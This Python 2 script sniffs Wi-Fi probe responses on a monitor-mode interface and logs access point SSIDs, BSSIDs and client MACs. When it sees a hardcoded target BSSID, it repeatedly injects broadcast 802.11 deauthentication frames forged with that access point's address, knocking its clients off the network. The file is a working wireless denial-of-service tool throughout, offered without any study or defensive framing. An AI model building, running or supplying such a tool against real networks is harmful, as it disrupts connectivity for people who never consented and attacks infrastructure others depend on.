from socket import *
import struct
import binascii
activeAps = []
sniff = socket(AF_PACKET, SOCK_RAW, 3)
sniff.bind(("wlan0mon", 0x0003))

activeSniff = True
while 1:
    while activeSniff:
        fm1 = sniff.recvfrom(1024)
        fm = fm1[0]
        if fm[38] == "\x50":
            probeResp = fm[38:62]
            # print ':'.join(x.encode('hex') for x in probeResp)
            probeHeadP = struct.unpack("!2s2s6s6s6s2s", probeResp)
            bssidMac = binascii.hexlify(probeHeadP[4])
            questioner = binascii.hexlify(probeHeadP[2])
            if bssidMac not in activeAps:
                activeAps.append(bssidMac)
                print "=============================================\n" \
                      "SSID: %s\nBSSID mac: %s\nQuestioner mac: %s" % (fm[76:85], bssidMac, questioner)
                if bssidMac == '3613e8404be2':
                    activeSniff = False

    else:
        pld = '00000c000480000002001800c0003a01ffffffffffff' + bssidMac + bssidMac + '00000700'
        dtP = pld.decode('hex')
        i=0
        while i<20:
            sniff.send(dtP)
            i+=1
        print '%d packets sent'%(i)
        activeSniff = True
